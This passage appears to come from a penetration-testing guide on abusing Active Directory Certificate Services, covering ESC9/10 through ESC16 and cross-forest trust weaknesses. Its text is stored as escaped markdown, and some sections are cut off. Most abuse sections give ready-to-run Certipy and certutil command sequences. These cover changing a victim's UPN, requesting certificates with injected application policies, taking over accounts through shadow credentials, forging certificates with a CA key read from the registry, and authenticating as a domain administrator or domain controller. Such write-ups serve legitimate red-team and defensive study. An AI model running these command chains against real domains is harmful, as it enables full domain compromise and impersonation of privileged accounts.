  \ auth -pfx administrator.pfx -domain corp.local\n```\n\n### Abuse Case 2\n\nWith the `CertificateMappingMethods` containing\
  \ the `UPN` bit flag (`0x4`), an account A with `GenericWrite` permissions can compromise any account B lacking a `userPrincipalName`\
  \ property, including machine accounts and the built-in domain administrator `Administrator`.\n\nHere, the goal is to compromise\
  \ `DC$@corp.local`, starting with obtaining `Jane`'s hash through Shadow Credentials, leveraging the `GenericWrite`.\n\n\
  ```bash\ncertipy shadow auto -username John@corp.local -p Passw0rd! -account Jane\n```\n\n`Jane`'s `userPrincipalName` is\
  \ then set to `DC$@corp.local`.\n\n```bash\ncertipy account update -username John@corp.local -password Passw0rd! -user Jane\
  \ -upn 'DC$@corp.local'\n```\n\nA certificate for client authentication is requested as `Jane` using the default `User`\
  \ template.\n\n```bash\ncertipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>\n```\n\n`Jane`'s `userPrincipalName`\
  \ is reverted to its original after this process.\n\n```bash\ncertipy account update -username John@corp.local -password\
  \ Passw0rd! -user Jane -upn 'Jane@corp.local'\n```\n\nTo authenticate via Schannel, Certipy’s `-ldap-shell` option is utilized,\
  \ indicating authentication success as `u:CORP\\DC$`.\n\n```bash\ncertipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell\n\
  ```\n\nThrough the LDAP shell, commands such as `set_rbcd` enable Resource-Based Constrained Delegation (RBCD) attacks,\
  \ potentially compromising the domain controller.\n\n```bash\ncertipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell\n\
  ```\n\nThis vulnerability also extends to any user account lacking a `userPrincipalName` or where it does not match the\
  \ `sAMAccountName`, with the default `Administrator@corp.local` being a prime target due to its elevated LDAP privileges\
  \ and the absence of a `userPrincipalName` by default.\n\n## Relaying NTLM to ICPR - ESC11\n\n### Explanation\n\nIf CA Server\

  \ access to ADCS CA with YubiHSM - ESC12\n\n### Explanation\n\nAdministrators can set up the Certificate Authority to store\
  \ it on an external device like the \"Yubico YubiHSM2\".\n\nIf USB device connected to the CA server via a USB port, or\
  \ a USB device server in case of the CA server is a virtual machine, an authentication key (sometimes referred to as a \"\
  password\") is required for the Key Storage Provider to generate and utilize keys in the YubiHSM.\n\nThis key/password is\
  \ stored in the registry under `HKEY_LOCAL_MACHINE\\SOFTWARE\\Yubico\\YubiHSM\\AuthKeysetPassword` in cleartext.\n\nReference\
  \ in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).\n\n### Abuse Scenario\n\nIf the CA's\
  \ private key stored on a physical USB device when you got a shell access, it is possible to recover the key.\n\nIn first,\
  \ you need to obtain the CA certificate (this is public) and then:\n\n```cmd\n# import it to the user store with CA certificate\n\
  $ certutil -addstore -user my <CA certificate file>\n\n# Associated with the private key in the YubiHSM2 device\n$ certutil\
  \ -csp \"YubiHSM Key Storage Provider\" -repairstore -user my <CA Common Name>\n```\n\nFinally, use the certutil `-sign`\
  \ command to forge a new arbitrary certificate using the CA certificate and its private key.\n\n## OID Group Link Abuse\
  \ - ESC13\n\n### Explanation\n\nThe `msPKI-Certificate-Policy` attribute allows the issuance policy to be added to the certificate\
  \ template. The `msPKI-Enterprise-Oid` objects that are responsible for issuing policies can be discovered in the Configuration\
  \ Naming Context (CN=OID,CN=Public Key Services,CN=Services) of the PKI OID container. A policy can be linked to an AD group\
  \ using this object's `msDS-OIDToGroupLink` attribute, enabling a system to authorize a user who presents the certificate\
  \ as though he were a member of the group. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).\n\
  \nIn other words, when a user has permission to enroll a certificate and the certificate is link to an OID group, the user\

  \ Renewal Configuration- ESC14\n\n### Explanation\n\nThe description at https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping\
  \ is remarkably thorough. Below is a quotation of the original text.\n\nESC14 addresses vulnerabilities arising from \"\
  weak explicit certificate mapping\", primarily through the misuse or insecure configuration of the `altSecurityIdentities`\
  \ attribute on Active Directory user or computer accounts. This multi-valued attribute allows administrators to manually\
  \ associate X.509 certificates with an AD account for authentication purposes. When populated, these explicit mappings can\
  \ override the default certificate mapping logic, which typically relies on UPNs or DNS names in the SAN of the certificate,\
  \ or the SID embedded in the `szOID_NTDS_CA_SECURITY_EXT` security extension.\n\nA \"weak\" mapping occurs when the string\
  \ value used within the `altSecurityIdentities` attribute to identify a certificate is too broad, easily guessable, relies\
  \ on non-unique certificate fields, or uses easily spoofable certificate components. If an attacker can obtain or craft\
  \ a certificate whose attributes match such a weakly defined explicit mapping for a privileged account, they can use that\
  \ certificate to authenticate as and impersonate that account.\n\nExamples of potentially weak `altSecurityIdentities` mapping\
  \ strings include:\n\n- Mapping solely by a common Subject Common Name (CN): e.g., `X509:<S>CN=SomeUser`. An attacker might\
  \ be able to obtain a certificate with this CN from a less secure source.\n- Using overly generic Issuer Distinguished Names\
  \ (DNs) or Subject DNs without further qualification like a specific serial number or subject key identifier: e.g., `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.\n\
  - Employing other predictable patterns or non-cryptographic identifiers that an attacker might be able to satisfy in a certificate\
  \ they can legitimately obtain or forge (if they have compromised a CA or found a vulnerable template like in ESC1).\n\n\
  The `altSecurityIdentities` attribute supports various formats for mapping, such as:\n\n- `X509:<I>IssuerDN<S>SubjectDN`\
  \ (maps by full Issuer and Subject DN)\n- `X509:<SKI>SubjectKeyIdentifier` (maps by the certificate's Subject Key Identifier\
  \ extension value)\n- `X509:<SR>SerialNumberBackedByIssuerDN` (maps by serial number, implicitly qualified by the Issuer\
  \ DN) - this is not a standard format, usually it's `<I>IssuerDN<SR>SerialNumber`.\n- `X509:<RFC822>EmailAddress` (maps\
  \ by an RFC822 name, typically an email address, from the SAN)\n- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (maps by\
  \ a SHA1 hash of the certificate's raw public key - generally strong)\n\nThe security of these mappings depends heavily\
  \ on the specificity, uniqueness, and cryptographic strength of the chosen certificate identifiers used in the mapping string.\
  \ Even with strong certificate binding modes enabled on Domain Controllers (which primarily affect implicit mappings based\
  \ on SAN UPNs/DNS and the SID extension), a poorly configured `altSecurityIdentities` entry can still present a direct path\
  \ for impersonation if the mapping logic itself is flawed or too permissive.\n### Abuse Scenario\n\nESC14 targets **explicit\
  \ certificate mappings** in Active Directory (AD), specifically the `altSecurityIdentities` attribute. If this attribute\
  \ is set (by design or misconfiguration), attackers can impersonate accounts by presenting certificates that match the mapping.\n\
  \n#### Scenario A: Attacker Can Write to `altSecurityIdentities`\n\n **Precondition**: Attacker has write permissions to\
  \ the target account’s `altSecurityIdentities` attribute or the permission to grant it in the form of one of the following\
  \ permissions on the target AD object:  \n- Write property `altSecurityIdentities`  \n- Write property `Public-Information`\

  \ Scenario B: Target Has Weak Mapping via X509RFC822 (Email)\n\n- **Precondition**: The target has a weak X509RFC822 mapping\
  \ in altSecurityIdentities. An attacker can set the victim's mail attribute to match the target's X509RFC822 name, enroll\
  \ a certificate as the victim, and use it to authenticate as the target.\n#### Scenario C: Target Has X509IssuerSubject\
  \ Mapping\n\n- **Precondition**: The target has a weak X509IssuerSubject explicit mapping in `altSecurityIdentities`.The\
  \ attacker can set the `cn` or `dNSHostName` attribute on a victim principal to match the subject of the target’s X509IssuerSubject\
  \ mapping. Then, the attacker can enroll a certificate as the victim, and use this certificate to authenticate as the target.\n\
  #### Scenario D: Target Has X509SubjectOnly Mapping\n\n- **Precondition**: The target has a weak X509SubjectOnly explicit\
  \ mapping in `altSecurityIdentities`. The attacker can set the `cn` or `dNSHostName` attribute on a victim principal to\
  \ match the subject of the target’s X509SubjectOnly mapping. Then, the attacker can enroll a certificate as the victim,\

  \n## EKUwu Application Policies(CVE-2024-49019) - ESC15\n\n### Explanation\n\nThe description at https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc\
  \ is remarkably thorough. Below is a quotation of the original text.\n\nUsing built-in default version 1 certificate templates,\
  \ an attacker can craft a CSR to include application policies that are preferred over the configured Extended Key Usage\
  \ attributes specified in the template. The only requirement is enrollment rights, and it can be used to generate client\
  \ authentication, certificate request agent, and codesigning certificates using the **_WebServer_** template\n\n### Abuse\n\
  \nThe following is referenced to [this link]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),Click\
  \ to see more detailed usage methods.\n\n\nCertipy's `find` command can help identify V1 templates that are potentially\
  \ susceptible to ESC15 if the CA is unpatched.\n\n```bash\ncertipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100\n\
  ```\n\n#### Scenario A: Direct Impersonation via Schannel\n\n**Step 1: Request a certificate, injecting \"Client Authentication\"\
  \ Application Policy and target UPN.** Attacker `attacker@corp.local` targets `administrator@corp.local` using the \"WebServer\"\
  \ V1 template (which allows enrollee-supplied subject).\n\n```bash\ncertipy req \\\n    -u 'attacker@corp.local' -p 'Passw0rd!'\
  \ \\\n    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \\\n    -ca 'CORP-CA' -template 'WebServer' \\\n    -upn 'administrator@corp.local'\
  \ -sid 'S-1-5-21-...-500' \\\n    -application-policies 'Client Authentication'\n```\n\n- `-template 'WebServer'`: The vulnerable\
  \ V1 template with \"Enrollee supplies subject\".\n- `-application-policies 'Client Authentication'`: Injects the OID `1.3.6.1.5.5.7.3.2`\
  \ into the Application Policies extension of the CSR.\n- `-upn 'administrator@corp.local'`: Sets the UPN in the SAN for\
  \ impersonation.\n\n**Step 2: Authenticate via Schannel (LDAPS) using the obtained certificate.**\n\n```bash\ncertipy auth\
  \ -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell\n```\n\n#### Scenario B: PKINIT/Kerberos Impersonation via Enrollment\
  \ Agent Abuse\n\n**Step 1: Request a certificate from a V1 template (with \"Enrollee supplies subject\"), injecting \"Certificate\
  \ Request Agent\" Application Policy.** This certificate is for the attacker (`attacker@corp.local`) to become an enrollment\
  \ agent. No UPN is specified for the attacker's own identity here, as the goal is the agent capability.\n\n```bash\ncertipy\
  \ req \\\n    -u 'attacker@corp.local' -p 'Passw0rd!' \\\n    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \\\n    -ca 'CORP-CA'\
  \ -template 'WebServer' \\\n    -application-policies 'Certificate Request Agent'\n```\n\n- `-application-policies 'Certificate\
  \ Request Agent'`: Injects OID `1.3.6.1.4.1.311.20.2.1`.\n\n**Step 2: Use the \"agent\" certificate to request a certificate\
  \ on behalf of a target privileged user.** This is an ESC3-like step, using the certificate from Step 1 as the agent certificate.\n\
  \n```bash\ncertipy req \\\n    -u 'attacker@corp.local' -p 'Passw0rd!' \\\n    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL'\
  \ \\\n    -ca 'CORP-CA' -template 'User' \\\n    -pfx 'attacker.pfx' -on-behalf-of 'CORP\\Administrator'\n```\n\n**Step\
  \ 3: Authenticate as the privileged user using the \"on-behalf-of\" certificate.**\n\n```bash\ncertipy auth -pfx 'administrator.pfx'\
  \ -dc-ip '10.0.0.100'\n```\n\n## Security Extension Disabled on CA (Globally)-ESC16\n\n### Explanation\n\n**ESC16 (Elevation\
  \ of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** refers to the scenario where, if the configuration of\
  \ AD CS does not enforce the inclusion of the **szOID_NTDS_CA_SECURITY_EXT** extension in all certificates, an attacker\
  \ can exploit this by:\n\n1. Requesting a certificate **without SID binding**.\n    \n2. Using this certificate **for authentication\
  \ as any account**, such as impersonating a high-privilege account (e.g., a Domain Administrator).\n\nYou can also refer\
  \ to this article to learn more about the detailed principle:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6\n\
  \n### Abuse\n\nThe following is referenced to [this link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally),Click\
  \ to see more detailed usage methods.\n\nTo identify whether the Active Directory Certificate Services (AD CS) environment\
  \ is vulnerable to **ESC16**\n\n```bash\ncertipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable\n\
  ```\n\n**Step 1: Read initial UPN of the victim account (Optional - for restoration).  \n\n\n```bash\ncertipy account \\\
  \n    -u 'attacker@corp.local' -p 'Passw0rd!' \\\n    -dc-ip '10.0.0.100' -user 'victim' \\\n    read\n```\n\n**Step 2:\
  \ Update the victim account's UPN to the target administrator's `sAMAccountName`.  \n\n```bash\ncertipy account \\\n   \
  \ -u 'attacker@corp.local' -p 'Passw0rd!' \\\n    -dc-ip '10.0.0.100' -upn 'administrator' \\\n    -user 'victim' update\n\
  ```\n\n**Step 3: (If needed) Obtain credentials for the \"victim\" account (e.g., via Shadow Credentials).**\n\n```shell\n\
  certipy shadow \\\n    -u 'attacker@corp.local' -p 'Passw0rd!' \\\n    -dc-ip '10.0.0.100' -account 'victim' \\\n    auto\n\
  ```\n\n**Step 4: Request a certificate as the \"victim\" user from _any suitable client authentication template_ (e.g.,\
  \ \"User\") on the ESC16-vulnerable CA.** Because the CA is vulnerable to ESC16, it will automatically omit the SID security\
  \ extension from the issued certificate, regardless of the template's specific settings for this extension. Set the Kerberos\
  \ credential cache environment variable (shell command):\n\n```bash\nexport KRB5CCNAME=victim.ccache\n```\n\nThen request\
  \ the certificate:\n\n```bash\ncertipy req \\\n    -k -dc-ip '10.0.0.100' \\\n    -target 'CA.CORP.LOCAL' -ca 'CORP-CA'\
  \ \\\n    -template 'User'\n```\n\n**Step 5: Revert the \"victim\" account's UPN.**\n\n```bash\ncertipy account \\\n   \
  \ -u 'attacker@corp.local' -p 'Passw0rd!' \\\n    -dc-ip '10.0.0.100' -upn 'victim@corp.local' \\\n    -user 'victim' update\n\
  ```\n\n**Step 6: Authenticate as the target administrator.**\n\n```bash\ncertipy auth \\\n    -dc-ip '10.0.0.100' -pfx 'administrator.pfx'\
  \ \\\n    -username 'administrator' -domain 'corp.local'\n```\n## Compromising Forests with Certificates Explained in Passive\
  \ Voice\n\n### Breaking of Forest Trusts by Compromised CAs\n\nThe configuration for **cross-forest enrollment** is made\
  \ relatively straightforward. The **root CA certificate** from the resource forest is **published to the account forests**\
  \ by administrators, and the **enterprise CA** certificates from the resource forest are **added to the `NTAuthCertificates`\
  \ and AIA containers in each account forest**. To clarify, this arrangement grants the **CA in the resource forest complete\
  \ control** over all other forests for which it manages PKI. Should this CA be **compromised by attackers**, certificates\
  \ for all users in both the resource and account forests could be **forged by them**, thereby breaking the security boundary\
  \ of the forest.\n\n### Enrollment Privileges Granted to Foreign Principals\n\nIn multi-forest environments, caution is\
  \ required concerning Enterprise CAs that **publish certificate templates** which allow **Authenticated Users or foreign\
  \ principals** (users/groups external to the forest to which the Enterprise CA belongs) **enrollment and edit rights**.\\\
  \nUpon authentication across a trust, the **Authenticated Users SID** is added to the user’s token by AD. Thus, if a domain\
  \ possesses an Enterprise CA with a template that **allows Authenticated Users enrollment rights**, a template could potentially\
  \ be **enrolled in by a user from a different forest**. Likewise, if **enrollment rights are explicitly granted to a foreign\
  \ principal by a template**, a **cross-forest access-control relationship is thereby created**, enabling a principal from\
  \ one forest to **enroll in a template from another forest**.\n\nBoth scenarios lead to an **increase in the attack surface**\
  \ from one forest to another. The settings of the certificate template could be exploited by an attacker to obtain additional\
  \ privileges in a foreign domain.\n\n\n## References\n\n- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)\n\
